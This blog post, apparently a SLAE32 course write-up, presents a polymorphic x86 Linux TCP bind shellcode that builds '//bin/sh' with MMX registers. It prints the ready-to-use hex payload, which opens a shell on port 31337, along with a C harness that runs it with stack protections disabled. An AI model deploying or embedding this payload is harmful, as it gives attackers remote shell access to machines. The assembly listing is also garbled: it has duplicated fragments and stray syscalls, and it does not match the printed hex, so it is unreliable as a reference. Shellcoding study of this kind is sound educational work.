---
title: SLAE32 Assignment 6 -- Polymorphic MMX TCP Bind Shellcode
date: 2019-9-15
layout: single
classes: wide
header:
  teaser: /assets/images/SLAE32.jpg
tags:
  - Bind
  - Shell
  - polymorphic
  - MMX
  - Assembly
  - Code
  - SLAE
  - Linux
  - x86
  - Shellcoding
  - Shellcode
--- 



For the sixth assignment in the SLAE32 Exam, we needed to create 3 polymorphic shellcodes; from existing shellcodes at shell-storm.org. A polymorphic shellcode means that it uses different instructions to deliver the same payload.  
For example, all of these instructions will result in the same action within a program.
```nasm
mov eax, 0x00000000      ; Clears the EAX Register
xor eax, eax             ; Clears the EAX Register
sub eax, eax             ; Clears the EAX Register
```
The first shellcode I modified was "tcpbindshell (108 bytes)", created by Russell Willis.  
This shellcode can be found at http://shell-storm.org/shellcode/files/shellcode-847.php.  

The original shellcode length was 108 bytes. Our assignment required that our polymorphic version of the shellcode to not exceed 150% of the original value. The final length of this polymorphic shellcode is 144 bytes.  
To push the filename string "//bin/sh" onto the stack, I used the MMX registers.  

```nasm
global _start
_start:
xor    eax,eax
xor    ebx,ebx
xor    ecx,ecx
xor    edx,edx
mov    al,0x66
mov    bl,0x1
push   ecx
push   0x6
push   0x1
push   0x2
mov    ecx,esp
int    0x80
mov    esi,eax
mov    al,0x66
mov    bl,0x2
push   edx
pushw  0x697a
push   bx
mov    ecx,esp
push   0x10
push   ecx
push   esi
mov    ecx,esp
int    0x80
mov    al,0x66
mov    bl,0x4
push   0x1
push   esi
mov    ecx,esp
int    0x80
mov    al,0x66
mov    bl,0x5
push   edx
push   edx
push   esi
mov    ecx,esp
int    0x80
mov    ebx,eax
xor    ecx,ecx
mov    cl,0x3

; dup2
int    0x80
        mov eax, edi    ; EAX = 0x66 used for socketcall SYSCAL
        inc ebx
push   edx
push   edx
push   esi
mov    ecx,esp
int    0x80

; setup dup2 loop
mov    ebx,eax
xor    ecx,ecx
mov    cl,0x3

; dup2
dup2Loop:
        dec ecx
mov    al,0x3f
int    0x80
jne    dup2Loop

push   edx
        mov edx, 0xffffffff             ; will be used to XOR the MM0 Register to result in "//bin/sh"
    mov eax, 0x978cd091             ; "n/sh" XOR'd with 0xffffffff
        ;   mov eax, 0x68732f6e             ; "n/sh"
    movd mm0, eax
    psllq mm0, 32                   ; shift the mm0 register left by 4 bytes
    mov ebx, 0x969dd0d0             ; "//bi" XOR'd with 0xffffffff
        ;   mov ebx, 0x69622f2f             ; "//bi"
    movd mm1, ebx
    paddb mm0, mm1                  ; now mm0 hold the 8 byte XOR'd "//bin/sh"
    movd mm1, edx                   ; mm1 is now 0xffffffff
    psllq mm1, 32                   ; mm1 is now 0xffffffff00000000
    movd mm2, edx                   ; mm2 us biw 0xffffffff
    paddb mm1, mm2                  ; mm1 is now 0xffffffffffffffff
    pxor mm0, mm1                   ; XOR's mm0 with mm1 and saves the results in mm0
    sub esp, 8                      ; Decrement the stack 8 bytes
    movq qword [esp], mm0           ; push "//bin/sh" from mm0 to the top of the stack

xor    eax,eax
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
push   eax
mov    edx,esp
mov    al,0xb
int    0x80
```  

I compiled and linked the shellcode. Then I used object dump to extract the hex.  
```console
root# nasm -f elf32 mmxTcpBindShell.nasm -o mmxTcpBindShell.o
root# ld mmxTcpBindShell.o -o mmxTcpBindShell
root# objdump -d tcpBindShell  | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
"\x31\xc9\xf7\xe1\x89\xc3\x6a\x66\x5f\x89\xf8\x43\x52\x6a\x06\x53\x6a\x02\x89\xe1\xcd\x80\x96\x89\xf8\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xf8\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\x89\xf8\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x49\xb0\x3f\xcd\x80\x75\xf9\x52\xba\xff\xff\xff\xff\xb8\x91\xd0\x8c\x97\x0f\x6e\xc0\x0f\x73\xf0\x20\xbb\xd0\xd0\x9d\x96\x0f\x6e\xcb\x0f\xfc\xc1\x0f\x6e\xca\x0f\x73\xf1\x20\x0f\x6e\xd2\x0f\xfc\xca\x0f\xef\xc1\x83\xec\x08\x0f\x7f\x04\x24\x31\xc0\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"
``` 
I loaded it into our shellcode testing program to ensure it still worked when injected into a host program.  
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x89\xc3\x6a\x66\x5f\x89\xf8\x43\x52\x6a\x06\x53\x6a\x02\x89\xe1\xcd\x80\x96\x89\xf8\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xcd\x80\x89\xf8\x43\x43\x6a\x01\x56\x89\xe1\xcd\x80\x89\xf8\x43\x52\x52\x56\x89\xe1\xcd\x80\x89\xc3\x31\xc9\xb1\x03\x49\xb0\x3f\xcd\x80\x75\xf9\x52\xba\xff\xff\xff\xff\xb8\x91\xd0\x8c\x97\x0f\x6e\xc0\x0f\x73\xf0\x20\xbb\xd0\xd0\x9d\x96\x0f\x6e\xcb\x0f\xfc\xc1\x0f\x6e\xca\x0f\x73\xf1\x20\x0f\x6e\xd2\x0f\xfc\xca\x0f\xef\xc1\x83\xec\x08\x0f\x7f\x04\x24\x31\xc0\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80";

main()
{
        printf("Shellcode Length:  %d\n", strlen(code));
        int (*ret)() = (int(*)())code;
        ret();
}
```
I then compiled the C program.  
```console
gcc -fno-stack-protector -z execstack -o shellcode shellcode.c
```




